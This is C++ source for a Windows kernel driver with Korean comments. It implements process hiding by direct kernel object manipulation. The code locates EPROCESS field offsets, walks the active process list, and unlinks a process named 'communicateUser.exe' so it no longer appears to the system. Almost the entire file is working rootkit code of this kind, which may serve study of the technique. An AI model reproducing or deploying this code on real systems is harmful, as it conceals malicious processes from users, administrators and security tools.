#include <ntddk.h>
#include <ntstrsafe.h>
#include "Offset.h"
#include "Hide.h"

extern "C"
static ULONG pidOffset = 0, nameOffset = 0, listEntryOffset = 0;

extern "C"
BOOLEAN InitializeOffsets()
{
	// 불투명 구조체 EPROCESS 멤버 변수 위치 계산
	nameOffset = CalcProcessNameOffset();			// 프로세스 이미지 이름
	pidOffset = CalcPIDOffset();					// PID
	listEntryOffset = pidOffset + sizeof(HANDLE);	// LIST_ENTRY

	if (pidOffset == 0 || nameOffset == 0)
		return FALSE;
	else
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "NameOffset Address: 0x%X\n", nameOffset);
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "PID Address: 0x%X\n", pidOffset);
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "ListEntry Address: 0x%X\n", listEntryOffset);
		return TRUE;
	}
}

extern "C"
VOID HideProcess()
{
	PLIST_ENTRY head, currentNode, prevNode;
	PEPROCESS eprocessStart;
	unsigned char* currentProcess = NULL;
	const char target[] = "communicateUser.exe";
	ANSI_STRING targetProcessName, currentProcessName;

	// 현재 프로세스를 EPROCESS 첫 노드로 설정한다.
	eprocessStart = IoGetCurrentProcess();
	head = currentNode = (PLIST_ENTRY)((unsigned char*)eprocessStart + listEntryOffset);
	RtlInitAnsiString(&targetProcessName, target);

	do
	{
		// LIST_ENTRY로부터 EPROCESS 구조체 획득
		currentProcess = (unsigned char*)((unsigned char*)currentNode - listEntryOffset);
		RtlInitAnsiString(&currentProcessName, (const char*)((unsigned char*)currentProcess + nameOffset));

		//Target Process인지 확인
		if (RtlCompareString(&targetProcessName, &currentProcessName, TRUE) == 0)
		{
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Found target process %s.\n", target);

			// TargetProcess의 이전 노드의 다음 링크를 TargetProcess의 다음 링크로 설정한다.
			// (A->B->C->) to (A->C)
			prevNode = currentNode->Blink;
			prevNode->Flink = currentNode->Flink;

			// TargetProcess의 다음 노드의 이전 링크를 TargetProcess의 이전 링크로 설정한다.
			// (A<-B<-C<-) to (A<-C)
			currentNode->Flink->Blink = prevNode;

			// TargetProcess의 링크를 자신으로 변경
			currentNode->Flink = currentNode;
			currentNode->Blink = currentNode;
			break;
		}

		currentNode = currentNode->Flink;
	} while (currentNode->Flink != head);
	// EPROCESS는 양방향 연결리스트로 연결되기 때문에 한번 순회하면 제자리로 돌아온다.
}